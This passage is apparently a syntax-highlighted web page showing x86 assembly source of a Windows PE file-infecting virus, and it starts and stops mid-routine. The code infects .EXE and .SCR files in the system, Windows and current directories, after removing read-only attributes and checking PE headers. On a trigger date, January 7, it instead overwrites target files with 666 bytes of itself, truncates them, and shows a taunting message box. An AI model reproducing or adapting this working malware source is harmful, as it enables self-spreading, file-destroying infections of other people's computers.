</span><span class="sc5">Loop_Get_API</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Retrieve API-address of</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; named function.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetProcAddressX</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Store API-address.</span><span class="sc0">
                </span><span class="sc6">STOSD</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; API not found?</span><span class="sc0">
                </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">JMP_Rest_SEH</span><span class="sc0">

</span><span class="sc5">Find_Next_API</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSB</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Found end of API-name?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Find_Next_API</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">; This is the end of module?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Loop_Get_API</span><span class="sc0">

                </span><span class="sc6">LODSB</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">; End of whole table?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Setup_Module</span><span class="sc0">

                </span><span class="sc1">; Get local date &amp; time.</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Local_Time</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetLocalTime</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Read_Header</span><span class="sc4">-</span><span class="sc5">Trash_Switch</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc1">; Is it time to say goodbye?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.Current_Month</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Start_Infect</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.Current_Day</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Start_Infect</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

</span><span class="sc5">Start_Infect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Trash_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Current_Directory</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Retrieve current path.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Retrieve Windoze-directory.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Retrieve System-directory.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc1">; Infect files in System-directory.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_Directory</span><span class="sc0">

                </span><span class="sc1">; Infect files in Windoze-directory.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_Directory</span><span class="sc0">

                </span><span class="sc1">; Infect files in current-directory.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_Directory</span><span class="sc0">

                </span><span class="sc1">; Display the you-are-fucked-window?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Trash_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Restore_SEH</span><span class="sc0">

                </span><span class="sc1">; Display an OK-box with a message.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Payload_Title</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Payload_Text</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">MessageBoxA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Restore_SEH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Restore original SEH.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Trash handler-address.</span><span class="sc0">

</span><span class="sc5">Execute_Host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POPAD</span><span class="sc0">                           </span><span class="sc1">; Restore registers &amp; flags.</span><span class="sc0">
                </span><span class="sc6">POPFD</span><span class="sc0">

                </span><span class="sc6">RET</span><span class="sc0">                             </span><span class="sc1">; RETurn to our host.</span><span class="sc0">


</span><span class="sc5">Payload_Title</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'.....'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; Silence means death...</span><span class="sc0">

</span><span class="sc5">Payload_Text</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'A HUM4N G0D THA7 WAS MAN-M4DE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WH3RE 1S Y0UR SAViOR N0W?!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Infect_Directory</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">PUSHAD</span><span class="sc0">

                </span><span class="sc1">; Clear infection-counter.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infect_Counter</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Search_Record</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Search_Mask</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">FindFirstFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Save search-handle in ESI.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Exit_Inf_Dir</span><span class="sc0">

</span><span class="sc5">Infect_Loop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSHAD</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Search_Record.Find_File_Name</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Trash_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Extension_OK</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

</span><span class="sc5">Find_End_Name</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSB</span><span class="sc0">                           </span><span class="sc1">; Get next byte of filename.</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Found end of the ASCIIZ ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Find_End_Name</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get extension DWORD.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Upcase_EAX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">             </span><span class="sc1">; Standard .EXE-file?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Extension_OK</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RCS.'</span><span class="sc0">             </span><span class="sc1">; Screensaver?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Infect</span><span class="sc0">

</span><span class="sc5">Extension_OK</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetFileAttributesA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; Error occurred?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exit_Infect</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">       </span><span class="sc1">; Get rid of readonly-flag.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">SetFileAttributesA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Error occurred?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Exit_Infect</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; PUSH filename + attributes</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; for Restore_Attr.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Open candidate-file.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">; Open existing.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">  </span><span class="sc1">; Read/write-access.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">CreateFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Error occurred?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Restore_Attr</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; For CloseHandle.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; Get candidate's filesize.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetFileSize</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Min_Size_Infect</span><span class="sc0">    </span><span class="sc1">; File too small?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Time_Last_Write</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Get filedates &amp; times.</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetFileTime</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">Trash_Switch</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0">              </span><span class="sc5">Debug_Mode</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Close_Handle</span><span class="sc0">

</span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc1">; Trash file with a part of the virus.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">666</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

                </span><span class="sc1">; Truncate file at 666 bytes.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">SetEndOfFile</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Restore_Stamp</span><span class="sc0">

                </span><span class="sc1">; Read the MZ-header.</span><span class="sc0">

</span><span class="sc5">Read_Header</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.EXE_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">    </span><span class="sc1">; It must be a true EXE-file.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.Reloc_Table</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">; Contains a new EXE-header?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">                </span><span class="sc1">; Seek to PE-header.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_File</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">92</span><span class="sc0">                 </span><span class="sc1">; Read-in the PE-header.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.PE_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">     </span><span class="sc1">; Verify it's a PE-header.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc1">; Program is executable?</span><span class="sc0">

                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.PE_Flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc1">; Don't infect DLL's.</span><span class="sc0">

                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.PE_Flags</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00100000b</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.CPU_Type</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14Ch</span><span class="sc0">    </span><span class="sc1">; Must be a 386+ file.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc1">; Is it already infected?</span><span class="sc0">

